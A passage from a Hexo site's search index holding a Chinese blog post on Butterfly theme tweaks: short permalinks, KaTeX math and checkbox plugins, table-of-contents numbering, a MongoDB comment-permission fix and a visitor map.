markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abbrlink: df27ccfb</span><br></pre></td></tr></table></figure><p>这个字符串就是这篇文章的唯一标识，无论修改标题还是发布文章都不会改变。</p><p>可以看到链接变短了</p></li></ul><img src="/p/66eef27/image-20221110012001480.png" class title="image-20221110012001480"><h2 id="4-数学公式显示问题">4. 数学公式显示问题</h2><p>解决方案：</p><p><a href="https://www.nickxu.top/2022/04/17/Hexo-Butterfly-%E5%BB%BA%E7%AB%99%E6%8C%87%E5%8D%97%EF%BC%88%E5%85%AB%EF%BC%89%E4%BD%BF%E7%94%A8-KaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/">https://www.nickxu.top/2022/04/17/Hexo-Butterfly-建站指南（八）使用-KaTeX-数学公式/</a></p><p>有得必有失，任务列表功能的渲染没了</p> <img src="/p/66eef27/image-20221110220015958.png" class title="image-20221110220015958"><p>可以利用外挂链接的方式，使用</p><p><a href="https://tzy1997.com/articles/0xiipgum/#%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95">https://tzy1997.com/articles/0xiipgum/#更新记录</a></p><p>虽然不能直接用</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> [ ] </span><br></pre></td></tr></table></figure><p>但是可以利用一下语句实现</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure>  <img src="/p/66eef27/image-20221111095006557.png" class title="image-20221111095006557"><h2 id="5-如何让目录只显示自己写的标号，不自动编号">5. 如何让目录只显示自己写的标号，不自动编号</h2><p>如果自动编号的话，在正文里没有体现，如果自己编号的同时又自动编号则乱成一团，如下</p> <img src="/p/66eef27/image-20221111213441247.png" class title="image-20221111213441247"><p>解决方法，在 <code>_config.butterfly.yml</code>中修改自动编号为 <code>false</code> 即可</p> <img src="/p/66eef27/image-20221111213547950.png" class title="image-20221111213547950"><p>然后一切就显得正常多了</p> <img src="/p/66eef27/image-20221111213620089.png" class title="image-20221111213620089"><h2 id="6-评论区不能正常发送">6. 评论区不能正常发送</h2> <img src="/p/66eef27/image-20221119215507359.png" class title="image-20221119215507359"><p>可以看到下面写了，不允许用户操作，说明数据库权限配置的有问题</p><p>参考stackoverflow解决的：</p><p><a href="https://stackoverflow.com/questions/46649390/mongoerror-user-is-not-allowed-to-do-action/73548143#">https://stackoverflow.com/questions/46649390/mongoerror-user-is-not-allowed-to-do-action/73548143#</a></p> <img src="/p/66eef27/image-20221119220135741.png" class title="image-20221119220135741"> <img src="/p/66eef27/image-20221119220158314.png" class title="image-20221119220158314"> <img src="/p/66eef27/image-20221119220257130.png" class title="image-20221119220257130"><p>变成如下界面再重新发送即可</p> <img src="/p/66eef27/image-20221119220036063.png" class title="image-20221119220036063"> <img src="/p/66eef27/image-20221119220317055.png" class title="image-20221119220317055"><h2 id="7-访客地图">7. 访客地图</h2><p>配置过程参考唐大佬的教程：</p><p><a href="https://tzy1997.com/articles/hexo1606/">https://tzy1997.com/articles/hexo1606/</a></p><p>但是里面的样式不是很好看，改用：</p><p><a href="https://www.revolvermaps.com/?target=setupgl">https://www.revolvermaps.com/?target=setupgl</a></p> <img src="/p/66eef27/image-20221119220436194.png" class title="image-20221119220436194"><p>其他步骤一样，只需要替换 <code>src</code> 中的内容即可</p> <img src="/p/66eef27/image-20221119220752556.png" class title="image-20221119220752556">]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
